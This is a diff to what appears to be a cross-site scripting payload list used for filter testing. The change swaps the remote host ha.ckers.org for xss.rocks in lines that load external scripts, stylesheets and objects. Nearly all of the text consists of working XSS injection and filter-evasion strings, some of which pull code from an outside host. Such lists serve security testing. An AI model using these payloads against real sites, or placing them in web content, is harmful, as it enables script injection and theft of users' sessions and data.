@@ -1,6 +1,6 @@
 <SCRIPT>alert('XSS');</SCRIPT>
 '';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
@@ -18,8 +18,8 @@ SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#10
 <IMG%0aSRC%0a=%0a"%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a'%0aX%0aS%0aS%0a'%0a)%0a"%0a>
 <IMG SRC=java%00script:alert(\"XSS\")>
 <SCR%00IPT>alert(\"XSS\")</SCR%00IPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?<B>
 <IMG SRC="javascript:alert('XSS')"
 <SCRIPT>a=/XSS/
 \";alert('XSS');//
@@ -30,12 +30,12 @@ SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#10
 <IMG LOWSRC="javascript:alert('XSS')">
 <BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
-<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<LAYER SRC="http://xss.rocks/scriptlet.html"></LAYER>
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
-<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
-<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
-<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
-<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
 <IMG SRC='vbscript:msgbox("XSS")'>
 <IMG SRC="mocha:[code]">
 <IMG SRC="livescript:[code]">
@@ -57,22 +57,22 @@ exp/*<XSS STYLE='no\xss:noxss("*//*");
 <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
 <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
 <BASE HREF="javascript:alert('XSS');//">
-<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
 <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
 getURL("javascript:alert('XSS')")
 a="get";
 <!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
-<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<XML SRC="http:/xss.rocks/xsstest.xml" ID=I></XML>
 <HTML><BODY>
-<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xss.rocks/xss.js></SCRIPT>'"-->
 <? echo('<SCR)';
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="xss.rocks/xss.js"></SCRIPT>
 
 
